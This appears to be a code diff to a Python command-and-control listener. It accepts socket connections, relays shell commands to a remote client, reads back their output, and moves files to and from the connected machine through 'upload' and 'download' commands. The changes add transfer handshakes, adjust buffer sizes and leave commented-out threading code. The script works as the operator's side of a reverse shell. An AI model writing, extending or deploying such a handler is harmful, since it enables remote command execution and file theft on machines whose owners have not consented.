@@ -2,6 +2,8 @@ import socket
 import os
 import traceback
 import subprocess
+import threading
+
 
 def start_server(host, port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,23 +18,31 @@ def start_server(host, port):
 
 
 def send_file(filename, client):
+    print('starting transfer [sending]')
+    o = client.recv(1024).decode()
+    print(o)
+
     with open(filename, 'rb') as f:
-        chunk = f.read(1024)
+        chunk = f.read(4096)
         while chunk:
             client.send(chunk)
-            chunk = f.read(1024)
+            chunk = f.read(4096)
         f.close()
-    client.close()
 
 
 def recv_file(filename, client):
+    print('starting transfer [receiving]')
+    o = client.recv(1024).decode()
+    print(o)
+
     with open(filename, 'wb') as f:
         while True:
-            data = client.recv(4096)
+            data = client.recv(1024)
             if not data:
                 break
             f.write(data)
         f.close()
+
 
 
 def shell_session(client, addr, server):
@@ -62,11 +72,23 @@ def shell_session(client, addr, server):
                 else:
                     subprocess.run(local_command, shell=True)
             elif command.startswith('upload'):
+                client.send(command.encode())
+
                 filename = command[7:].strip()
                 send_file(filename, client)
+                continue
+                #thread = threading.Thread(target=send_file, args=(filename, client))
+                #thread.start()
+                #thread.join()
             elif command.startswith('download'):
+                client.send(command.encode())
+
                 filename = command[9:].strip()
                 recv_file(filename, client)
+                continue
+                #thread = threading.Thread(target=recv_file, args=(filename, client))
+                #thread.start()
+                #thread.join()
             else:
                 client.send(command.encode())
                 output = client.recv(1024).decode()
